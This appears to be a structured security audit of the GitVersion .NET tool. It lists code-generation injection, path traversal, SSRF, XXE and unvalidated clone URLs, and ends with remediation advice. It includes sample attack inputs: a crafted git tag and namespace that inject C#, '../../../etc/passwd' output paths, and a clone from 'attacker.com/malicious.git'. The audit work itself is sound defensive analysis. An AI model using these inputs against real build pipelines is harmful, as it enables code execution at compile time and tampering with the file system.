dangerous_sinks_found.title: Namespace injection in generated C# code
dangerous_sinks_found.description: RootNamespace (from MSBuild task) flows unsanitized into C# namespace declaration, allowing code injection
attacker_controlled_input: GenerateGitVersionInformation.ProjectFile (file name used as fallback namespace)
dangerous_sinks_found.attack_scenario: Attacker controls RootNamespace property in MSBuild task or project file → injects C# code like: 'System { class Pwned {} }' → Generated code contains injected namespace → Code compilation includes attacker payload

dangerous_sinks_found.title: Version variables interpolated unsanitized into code generation templates
dangerous_sinks_found.description: GitVersionVariables (from git history) are formatted directly into code using string.Format without escaping. Malicious version numbers (e.g., via git tags) could inject code.
attacker_controlled_input: Git tag names / version strings (AssemblySemVer, InformationalVersion, etc.)
Environment variables passed as version overrides

code_context.vulnerable_code: var lines = variables.OrderBy(x => x.Key).Select(v => string.Format(indentation + addFormat, v.Key, v.Value));
code_context.template_format: addFormat template from embedded resources (e.g., GitVersionInformation.cs)

dangerous_sinks_found.attack_scenario: Git repository with crafted tag like '1.0.0"; /* injected */ public string Payload = "' → Version variables parsed from tag → string.Format inserts into template → Generated C# contains injected code
dangerous_sinks_found.impact: Code injection during version generation; arbitrary code execution at compile time
dangerous_sinks_found.note: Also affects AssemblyInfo generation via same mechanism at src/GitVersion.Output/AssemblyInfo/AssemblyInfoFileUpdater.cs:144

dangerous_sinks_found.title: OutputFile path not validated before write
dangerous_sinks_found.description: OutputFile argument is passed directly to File.WriteAllText without path normalization or directory traversal validation
dangerous_sinks_found.attack_scenario: GitVersion called with /outputfile=../../../etc/passwd (or similar Windows equivalent) → JSON written to arbitrary location outside intended directory
dangerous_sinks_found.impact: Write arbitrary files to filesystem (if permissions allow)

dangerous_sinks_found.type: Path Traversal in Config File Loading
dangerous_sinks_found.title: ConfigurationFile path combined with user input without normalization
dangerous_sinks_found.description: ConfigurationFile argument is combined with TargetPath using Path.Combine and later read. While there is some validation, Path.Combine doesn't prevent traversal if second arg is rooted.

code_context.config_path_resolution: ArgumentParser.cs line 537-548: combines TargetPath + ConfigurationFile with GetFullPath

dangerous_sinks_found.attack_scenario: If validation at line 530 is bypassed or incomplete: config file loaded from unintended location → YAML deserialized → Potential for XXE or other injection if YAML parser is vulnerable
dangerous_sinks_found.impact: Read arbitrary files (limited by permissions); potential deserialization attack

dangerous_sinks_found.title: Unvalidated environment variable used as HTTP endpoint
dangerous_sinks_found.description: APPVEYOR_API_URL environment variable flows directly to HttpClient BaseAddress without URL validation or scheme checking
attacker_controlled_input: APPVEYOR_API_URL environment variable (attacker-controlled in compromised build environment)
dangerous_sinks_found.attack_scenario: In AppVeyor build environment, if APPVEYOR_API_URL is set to 'http://internal.service.local' or 'file:///' → HTTP requests sent to attacker-controlled endpoint or internal services
dangerous_sinks_found.impact: Server-Side Request Forgery (SSRF) to access internal services or redirect requests

dangerous_sinks_found.title: XmlDocument.LoadXml used without DTD restrictions
dangerous_sinks_found.description: XmlDocument without DTD processing disabled could be vulnerable to XXE if content is attacker-controlled

code_context.note: XML is GENERATED, not user-controlled input, so risk is LOW. GetWixFormatFromVersionVariables constructs it from version variables using StringBuilder.Append.

dangerous_sinks_found.attack_scenario: Version variables with special XML characters (e.g., version='1.0"> <![CDATA[INJECTION]]> <') → If not properly escaped in GetWixFormatFromVersionVariables, could break XML structure
dangerous_sinks_found.impact: XML structure corruption or injection (actual XXE unlikely since XML is generated, not parsed from user input)

dangerous_sinks_found.title: Activator.CreateInstance with type from version variables
dangerous_sinks_found.description: Activator.CreateInstance is used to deserialize GitVersionVariables, but only for known GitVersionVariables type (not user-controlled type names)
attacker_controlled_input: JSON file content (GitVersionVariables.FromJson); type is fixed to GitVersionVariables
dangerous_sinks_found.attack_scenario: Not exploitable in normal flow since type is hardcoded to GitVersionVariables. JSON deserialization via JsonSerializer (safer than BinaryFormatter) with context-based type.
dangerous_sinks_found.impact: No direct risk; type is not attacker-controlled

dangerous_sinks_found.title: XElement.Parse on project file content without DTD restrictions
dangerous_sinks_found.description: Project file (csproj/vbproj) is parsed with XElement.Parse which could be vulnerable to XXE if project file is attacker-controlled
dangerous_sinks_found.attack_scenario: Attacker controls .csproj in repository → injects XXE payload → XXE executed during GitVersion execution
dangerous_sinks_found.impact: XXE vulnerability (file disclosure, SSRF) if XXE payloads in project file are not filtered
dangerous_sinks_found.note: XElement.Parse in .NET does NOT process external entities by default (XElement uses XmlReaderSettings with safe defaults), so XXE risk is LOW

dangerous_sinks_found.title: Git repository URL not validated before clone
dangerous_sinks_found.description: Repository URL from CLI args passed directly to Repository.Clone without URL validation or scheme checking
dangerous_sinks_found.attack_scenario: GitVersion /targeturl=file:///etc/passwd → Attempts to clone from local filesystem → LibGit2Sharp may reject (but depends on version) or GitVersion /targeturl=https://attacker.com/malicious.git → Clones malicious repo
dangerous_sinks_found.impact: Git protocol attacks, local file disclosure, credential exposure if auth is provided

critical_patterns.impact: Code injection at compile time → RCE
Code injection via git tags → RCE

remediation_recommendations.recommendation: Sanitize/validate RootNamespace before using in code generation. Use a whitelist of allowed characters (alphanumeric, dots, underscores). Use CSharpSyntaxTree.ParseText or Roslyn to validate syntax rather than string.Format.
Escape version variable values before string interpolation. Use HTML/XML encoding or escape special characters. Better: use AST-based code generation (Roslyn) instead of string.Format templates.
Validate OutputFile path: ensure it's within working directory, use Path.GetFullPath and check it doesn't traverse parent directories.
Strengthen ConfigurationFile path validation. Use Path.GetFullPath and verify result is within allowed directories. Consider whitelist of allowed paths.
Validate APPVEYOR_API_URL: whitelist allowed hosts, use Uri.TryCreate with UriKind.Absolute, reject file:// and other non-http(s) schemes.
Validate TargetUrl: reject file:// and ssh:// schemes (or whitelist https:// only), use Uri validation before passing to Clone.
